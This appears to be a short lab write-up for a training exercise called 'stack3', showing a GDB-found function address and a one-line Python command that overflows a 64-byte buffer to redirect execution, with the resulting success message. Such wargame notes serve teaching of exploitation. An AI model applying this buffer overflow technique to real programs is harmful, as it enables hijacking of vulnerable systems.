Using GDB on stack3 reveals the function is located at 0x08048424
Piping in input using python thorugh the following command
  (python -c "print 's'*64 + '\x24\x84\x04\x08'";) | ./stack3
Prints "code flow successfully changed"
